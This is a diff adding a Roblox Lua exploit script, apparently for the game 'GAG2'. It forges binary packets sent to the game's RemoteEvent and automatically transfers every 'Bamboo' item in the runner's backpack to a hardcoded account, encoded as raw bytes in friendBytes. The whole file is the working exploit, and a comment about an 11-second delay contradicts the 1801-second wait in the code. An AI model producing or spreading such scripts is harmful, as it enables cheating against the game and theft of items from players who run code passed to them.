@@ -1,0 +1,148 @@
+-- CẤU HÌNH NGƯỜI NHẬN
+local friendBytes = "\208\053\048\000\004\066" 
+local remote = game:GetService("ReplicatedStorage"):WaitForChild("SharedModules"):WaitForChild("Packet"):WaitForChild("RemoteEvent")
+
+-- BIẾN ĐIỀU KHIỂN
+local isAutoEnabled = true
+local isSending = false
+local isScriptRunning = true 
+
+-- SERVICES
+local Players = game:GetService("Players")
+local backpack = Players.LocalPlayer:WaitForChild("Backpack")
+
+-- TẠO UI CHÍNH
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BaHoai_Bamboo_Only"
+ScreenGui.Parent = game.CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 200)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = MainFrame
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 5)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseButton1Click:Connect(function()
+    isScriptRunning = false 
+    isAutoEnabled = false
+    ScreenGui:Destroy()
+end)
+
+local MainSystem = Instance.new("Frame")
+MainSystem.Size = UDim2.new(1, 0, 1, 0)
+MainSystem.BackgroundTransparency = 1
+MainSystem.Parent = MainFrame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Text = "Auto GAG2 [BAMBOO ONLY]"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 127) -- Màu xanh lá cho Bamboo
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 18
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Parent = MainSystem
+
+local TargetLabel = Instance.new("TextLabel")
+TargetLabel.Size = UDim2.new(1, 0, 0, 30)
+TargetLabel.Position = UDim2.new(0, 0, 0.3, 0)
+TargetLabel.Text = "Đang gửi tới: luuhoaidz"
+TargetLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+TargetLabel.BackgroundTransparency = 1
+TargetLabel.Parent = MainSystem
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 200, 0, 50)
+ToggleBtn.Position = UDim2.new(0.5, -100, 0.6, 0)
+ToggleBtn.Text = "TỰ ĐỘNG: BẬT"
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Parent = MainSystem
+local BtnCorner = UICorner:Clone() BtnCorner.Parent = ToggleBtn
+
+-- DANH SÁCH VẬT PHẨM (CHỈ CÒN BAMBOO)
+local supportedItems = {
+    ["Bamboo"] = "Seeds"
+}
+
+local function formatLV(str) return "\v" .. string.char(#str) .. str end
+
+local function sendBatch(items)
+    local n = #items
+    local headerByteValue = 14 + (n * 6)
+    local header = "\249\000" .. string.char(headerByteValue) .. "\000\000" .. friendBytes
+    local payload = ""
+    for i, data in ipairs(items) do
+        -- Giới hạn stack 255 để tránh lỗi char
+        local safeCount = math.clamp(math.floor(tonumber(data.count) or 1), 1, 255)
+        
+        local indexMarker = (i == 1) and ("\028\005" .. string.char(i) .. "\028") or ("\005" .. string.char(i) .. "\028")
+        payload = payload .. indexMarker .. "\v\aItemKey" .. formatLV(data.name) .. "\v\005Count\005" .. string.char(safeCount) .. "\v\bCategory" .. formatLV(data.cat) .. "\000"
+    end
+    remote:FireServer(buffer.fromstring(header .. payload .. "\000\000"))
+end
+
+local function runAutoTrade()
+    if isSending or not isAutoEnabled then return end
+    isSending = true
+    
+    local allItems = {}
+    for _, item in ipairs(backpack:GetChildren()) do
+        local category = supportedItems[item.Name]
+        if category then
+            table.insert(allItems, {
+                name = item.Name, 
+                cat = category, 
+                count = item:GetAttribute("Count") or 1
+            })
+        end
+    end
+
+    if #allItems > 0 then
+        local batchSize = 20 -- Tối đa 20 Bamboo mỗi gói
+        for i = 1, #allItems, batchSize do
+            if not isAutoEnabled or not isScriptRunning then break end
+            local batch = {}
+            for j = i, math.min(i + batchSize - 1, #allItems) do 
+                table.insert(batch, allItems[j]) 
+            end
+            sendBatch(batch)
+            task.wait(1801) -- Delay 11s giữa các gói
+        end
+    end
+    isSending = false
+end
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    isAutoEnabled = not isAutoEnabled
+    ToggleBtn.Text = isAutoEnabled and "TỰ ĐỘNG: BẬT" or "TỰ ĐỘNG: TẮT"
+    ToggleBtn.BackgroundColor3 = isAutoEnabled and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
+end)
+
+task.spawn(function()
+    while isScriptRunning do
+        if isAutoEnabled and not isSending then
+            runAutoTrade()
+        end
+        task.wait(1)
+    end
+end)
